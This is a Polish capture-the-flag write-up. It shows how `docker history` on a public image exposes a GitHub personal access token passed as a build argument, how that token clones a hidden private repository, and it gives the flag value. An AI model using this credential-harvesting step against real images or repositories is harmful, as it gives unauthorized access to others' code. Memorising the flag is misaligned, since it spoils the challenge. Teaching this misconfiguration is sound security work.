# Rozwiązanie - Git

Skoro mamy dostępny tylko obraz możemy zrobić dwie rzeczy:
- Zobaczyć polecenia budujące obraz używająć `docker history`
- Przeglądać pliki gotowego obrazu 

Zobaczmy zatem `docker history`:

```sh
docker pull typicalam/myawesomeapp
docker history --no-trunc typicalam/myawesomeapp
```

W środku poleceń kontenera zauważamy, że używa czegoś do zdobycia najnowszego `tag` z GitHuba. Wchodzimy na repozytorium [https://github.com/TypicalAM/VulnerablePAT](https://github.com/TypicalAM/VulnerablePAT) - nie istnieje, ale czy na pewno? Może nie mamy uprawnień...

Dodatkowo w `ARG`ach budowy znajduje się `GH_ACCESS`, które wygląda jak [Personal Access Token (PAT)](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens) od GitHuba. Może damy radę użyć tego klucza, aby zdobyć dostęp do repozytorium? Spróbujmy:

```sh
export GH_ACCESS=github_pat...
git clone https://TypicalAM:$GH_ACCESS@github.com/TypicalAM/VulnerablePAT

Cloning into 'VulnerablePAT'...
remote: Enumerating objects: 14, done.
remote: Counting objects: 100% (14/14), done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 14 (delta 3), reused 12 (delta 1), pack-reused 0 (from 0)
Receiving objects: 100% (14/14), done.
Resolving deltas: 100% (3/3), done.
```

Zobaczmy co jest w środku:

```sh
ls VulnerablePAT
Dockerfile  FLAGA.md  go.mod  main.go  README.md
```

Flaga? Zdobyta.

```sh
cat VulnerablePAT/FLAGA.md
PUTrequest{ARG_za_i_przeciw}
```
